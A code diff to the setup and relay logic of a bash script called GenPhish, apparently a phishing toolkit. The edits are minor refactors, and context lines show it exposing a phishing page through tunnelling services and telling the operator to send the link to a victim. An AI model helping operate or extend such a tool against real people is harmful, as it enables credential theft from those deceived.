@@ -32,7 +32,7 @@ VERSION="1.0"
 trap kill_quit INT
 
 function user_privs(){
-	if [ $EUID = 0 ] ; then 
+	if [ $EUID -eq 0 ] ; then 
   		echo -n
   	else
   		echo -e "[x] You don't have root privileges"
@@ -41,7 +41,7 @@ function user_privs(){
 }
 
 function shortcut(){
-	command -v genphish 1> /dev/null 2>&1 || { 
+	which genphish 1> /dev/null 2>&1 || { 
 		read -p "[?] Do you want to create a shortcut for genphish in your system (Y/n)> " -n 1 -e option
 		if [[ "$option" =~ ^[YyOo]$ ]] ; then
 			#echo -e "alias genphish=\"cd $MAIN_PATH && ./genphish.sh\"" >> ~/.bashrc
@@ -65,7 +65,7 @@ function internet(){
 }
 
 function verify_prog(){
-    command -v $1 1> /dev/null 2>&1 || { 
+    which $1 1> /dev/null 2>&1 || { 
     	echo -e "$grey[x] $1$yellow not installed$grey"
     	#read -p "Push ENTER to install" enter
     	echo -ne "[+] Installation of $yellow$1$grey in progress..."
@@ -78,7 +78,7 @@ function setup(){
 	user_privs
 	shortcut
 	internet
-	if [ $? = "2" ] ; then
+	if [ $? -eq 2 ] ; then
 		exit 1
 	else
 		echo -e "[+] Install Dependencies of GenPhish..."
@@ -495,7 +495,7 @@ Choose the HTTP(S) Relay$grey
 
 	3 | 03 )
 		cd $MAIN_PATH/relays/
-		command -v openport 1> /dev/null 2>&1 || { 
+		which openport 1> /dev/null 2>&1 || { 
 	    	echo -e "[+] Installation of$yellow openport$grey in progress..."
 	    	sudo dpkg -i openport_*.deb 1> /dev/null
     	}
@@ -508,7 +508,7 @@ Choose the HTTP(S) Relay$grey
 	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;
 
 	4 | 04 )
-		command -v lt 1> /dev/null 2>&1 || { 
+		which lt 1> /dev/null 2>&1 || { 
 		    echo -e "[+] Installation of$yellow Localtunnel$grey in progress..."
 		   	npm install -g localtunnel 1> /dev/null
 		   	npm install -g npm 1> /dev/null
@@ -595,7 +595,7 @@ function kill_quit(){
 
 function update(){
 	internet
-	if [ $? = "2" ] ; then
+	if [ $? -eq 2 ] ; then
 		exit 1
 	else
 		echo -e "[+] Update of GenPhish in progress..."
@@ -606,7 +606,6 @@ function update(){
 		rm -rf GenPhish/
 		sudo chmod +x genphish.sh log_script.sh 1> /dev/null
 		echo -e "$green OK$grey"
-		./genphish.sh --setup
 		./genphish.sh --version
 		exit 1
 	fi
@@ -681,7 +680,7 @@ verify_html
 retrieve_variables
 display_log
 #If not Internet relays can not work
-if [ $? = "2" ] ; then
+if [ $? -eq 2 ] ; then
 	exit 1
 else
 	relays
